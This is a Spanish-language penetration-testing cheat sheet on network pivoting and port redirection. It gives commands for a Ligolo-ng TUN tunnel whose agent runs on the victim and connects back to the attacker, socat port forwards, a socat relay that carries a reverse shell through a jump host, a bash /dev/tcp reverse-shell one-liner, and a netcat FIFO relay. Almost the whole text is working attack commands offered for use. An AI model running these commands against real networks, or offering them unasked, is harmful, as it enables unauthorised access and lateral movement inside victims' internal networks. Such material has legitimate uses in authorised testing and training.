# Port Redirection and Pivoting Cheat Sheet

Comandos y configuración para el establecimiento de túneles de red, redirección de puertos y enrutamiento interno (pivoting).

---

## 1. Ligolo-ng (Pivoting via TUN)

Ligolo-ng permite crear una interfaz de red TUN virtual en el atacante para enrutar tráfico directamente hacia la subred interna sin necesidad de un proxy SOCKS (soporta escaneos SYN de Nmap, ejecuciones de NetExec, etc.).

### Paso 1: Configuración de Interfaz TUN (Atacante - Linux)
```bash
# Crear interfaz TUN de nombre 'ligolo'
sudo ip tuntap add user <TU_USUARIO> mode tun ligolo
# Levantar la interfaz
sudo ip link set ligolo up
```

### Paso 2: Iniciar Servidor Proxy (Atacante)
```bash
./proxy -selfcert
```

### Paso 3: Iniciar Agente (Víctima)
* **Linux**:
  ```bash
  ./agent -connect <IP_ATACANTE>:11601 -ignore-cert
  ```
* **Windows**:
  ```cmd
  agent.exe -connect <IP_ATACANTE>:11601 -ignore-cert
  ```

### Paso 4: Establecer Sesión y Rutas (Atacante)
1. En la consola interactiva del `proxy` de Ligolo:
   ```text
   ligolo-ng » session
   # (Seleccionar la sesión de agente activa)
   ligolo-ng » start
   ```
2. En una nueva terminal de la máquina atacante, añadir la ruta hacia la subred del objetivo (ej. `192.168.20.0/24`):
   ```bash
   sudo ip route add 192.168.20.0/24 dev ligolo
   ```
3. Ejecución directa de comandos contra la subred:
   ```bash
   nmap -sS -Pn -p 80,445 192.168.20.10
   ```

---

## 2. Socat (Redirección de Puertos TCP)

Establecimiento de sockets de red bidireccionales.

* **Redirección local (Port Forwarding)**:
  Redirige el puerto local `8080` de la máquina de salto hacia el puerto `80` del host interno de la red:
  ```bash
  socat TCP-LISTEN:8080,fork,reuseaddr TCP:<IP_INTERNA>:80
  ```
* **Túnel inverso (Reverse Relay)**:
  Permite recibir una shell reversa desde una máquina sin salida directa a Internet, redirigiéndola por la máquina de salto hacia el atacante.
  1. Ejecución en máquina de salto (puerto `4444` hacia el puerto `4444` del atacante):
     ```bash
     socat TCP-LISTEN:4444,fork,reuseaddr TCP:<IP_ATACANTE>:4444
     ```
  2. Ejecución en máquina interna (lanzamiento de shell reversa hacia la IP de salto):
     ```bash
     bash -i >& /dev/tcp/<IP_SALTO>/4444 0>&1
     ```

---

## 3. Netcat Relays (Pivoting con FIFO)

Alternativa en Linux si Socat no está presente, mediante tuberías FIFO (`mkfifo`).

* **Crear Relay TCP en el puerto 8080 hacia un puerto interno**:
  ```bash
  rm /tmp/f; mkfifo /tmp/f
  cat /tmp/f | nc -v <IP_INTERNA> 80 | nc -lvnp 8080 > /tmp/f
  ```
